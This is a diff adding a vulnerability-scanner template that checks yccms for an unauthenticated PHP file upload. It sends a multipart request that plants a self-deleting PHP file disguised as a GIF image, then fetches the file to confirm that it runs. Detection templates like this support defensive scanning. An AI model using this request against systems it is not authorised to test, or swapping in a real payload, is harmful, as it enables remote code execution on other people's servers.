@@ -1,0 +1,51 @@
+id: yccms_Unauthorized_file_Upload_2
+
+info:
+  name: yccms_Unauthorized_file_Upload
+  author: xiaohe
+  severity: high
+  description: description
+  reference:
+    - https://xz.aliyun.com/t/7748
+  tags: yccms
+
+requests:
+  - raw:
+      - |
+        POST /admin/?a=call&m=xhUp&type=xh HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=---------------------------40362855639993227904106443314
+
+        -----------------------------40362855639993227904106443314
+        Content-Disposition: form-data; name="filedata"; filename="test.php"
+        Content-Type: image/png
+
+        GIF89a
+        <?php echo md5("99838473");unlink(__FILE__);?>
+        -----------------------------40362855639993227904106443314--
+
+      - |
+        GET /uploads/{{path}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+
+    extractors:
+      - type: regex
+        name: path
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - 'uploads/([0-9]*).php'
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200"
+          - "contains(body_1, '警告：此图片类型本系统不支持')"
+          - "contains(body_2, 'e1253dfadc2f98b3d890894c7d291ef7')"
+        condition: and
